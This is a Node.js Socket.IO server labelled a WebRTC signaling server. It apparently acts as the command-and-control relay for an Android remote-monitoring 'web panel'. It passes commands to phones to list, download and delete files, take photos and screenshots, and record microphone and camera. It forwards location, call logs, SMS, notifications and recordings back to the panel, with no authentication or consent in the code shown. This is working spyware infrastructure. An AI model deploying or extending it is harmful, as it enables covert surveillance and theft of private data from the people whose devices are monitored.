/**
 * server.js — WebRTC Signaling Server
 * Runs on Render.com (Node.js)
 *
 * CORS: allows connections from your PHP web panel host.
 * Edit the ALLOWED_ORIGINS array below to add your PHP host domain.
 */

const express    = require('express');
const http       = require('http');
const { Server } = require('socket.io');
const path       = require('path');

const app    = express();
const server = http.createServer(app);

// ─────────────────────────────────────────────────────────────────────────────
// CORS — Add your PHP web panel domain here
// ─────────────────────────────────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
    'https://yourdomain.com',        // ← replace with your PHP host domain
    'http://localhost',
    'http://localhost:3000',
    'http://127.0.0.1',
    'http://127.0.0.1:3000',
    /.*\.onrender\.com$/,
];

const io = new Server(server, {
    cors: {
        origin: (origin, cb) => {
            if (!origin) return cb(null, true);
            const allowed = ALLOWED_ORIGINS.some(o =>
                o instanceof RegExp ? o.test(origin) : o === origin
            );
            cb(allowed ? null : new Error('CORS blocked: ' + origin), allowed);
        },
        methods: ['GET', 'POST'],
        credentials: false,
    },
    transports: ['websocket', 'polling'],
    maxHttpBufferSize: 50 * 1024 * 1024, // 50 MB — needed for video/audio chunks
});

const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// ─────────────────────────────────────────────────────────────────────────────
// Socket.IO
// ─────────────────────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
    console.log('[+] Connected:', socket.id);

    // ── Role identification ──────────────────────────────────────────────────
    socket.on('identify', (role) => {
        socket._role = role;
        console.log(`[role] ${socket.id} -> ${role}`);

        if (role === 'android') {
            socket.join('android');
            io.to('web').emit('android-device-connected', {
                socketId: socket.id,
                name:     'Device-' + socket.id.substring(0, 6),
                online:   true,
            });
            const webSockets = [...io.sockets.sockets.values()].filter(s => s._role === 'web');
            if (webSockets.length > 0) socket.emit('web-client-ready', webSockets[0].id);
        }

        if (role === 'web') {
            socket.join('web');
            const androidList = [...io.sockets.sockets.values()]
                .filter(s => s._role === 'android')
                .map(s => ({ socketId: s.id, name: 'Device-' + s.id.substring(0, 6), online: true }));
            socket.emit('device-list', androidList);
            socket.broadcast.to('android').emit('web-client-ready', socket.id);
        }
    });

    // ── WebRTC signal relay ──────────────────────────────────────────────────
    socket.on('signal', (msg) => {
        const target = io.sockets.sockets.get(msg.to);
        if (target) target.emit('signal', { ...msg, from: socket.id });
    });

    // ── Commands: web -> android ─────────────────────────────────────────────
    // Basic controls
    ['torch', 'switch_camera', 'sync_data',
     'fs:list', 'fs:download', 'fs:download_ready', 'fs:delete',
     // Capture & record commands (NEW)
     'capture:photo',          // capture a still photo from camera
     'capture:screenshot',     // capture device screenshot
     'record:voice:start',     // start microphone recording
     'record:voice:stop',      // stop microphone recording
     'record:video:start',     // start camera video recording
     'record:video:stop',      // stop camera video recording
    ].forEach(event => {
        socket.on(event, (data) => {
            const target = io.sockets.sockets.get(data.to);
            if (target) target.emit(event, { ...data, from: socket.id });
        });
    });

    // ── Data events: android -> web ──────────────────────────────────────────
    ['location', 'call_log', 'sms', 'notification',
     'fs:files', 'fs:download_start', 'fs:download_chunk',
     'fs:download_complete', 'fs:download_error',
     // Capture & record results (NEW)
     'capture:photo:result',       // { from, imageBase64, mimeType, ts }
     'capture:screenshot:result',  // { from, imageBase64, mimeType, ts }
     'record:voice:chunk',         // { from, audioBase64, mimeType }
     'record:voice:result',        // { from, audioBase64, mimeType, duration }
     'record:video:chunk',         // { from, videoBase64, mimeType }
     'record:video:result',        // { from, videoBase64, mimeType, duration }
    ].forEach(event => {
        socket.on(event, (data) => {
            io.to('web').emit(event, { ...data, from: socket.id });
        });
    });

    // ── Disconnect ───────────────────────────────────────────────────────────
    socket.on('disconnect', () => {
        console.log('[-] Disconnected:', socket.id, '| role:', socket._role || 'unknown');
        io.to('web').emit('android-device-disconnected', { socketId: socket.id });
        io.to('android').emit('web-client-disconnected', socket.id);
    });
});

server.listen(PORT, () => console.log(`✅ Signaling server running on port ${PORT}`));
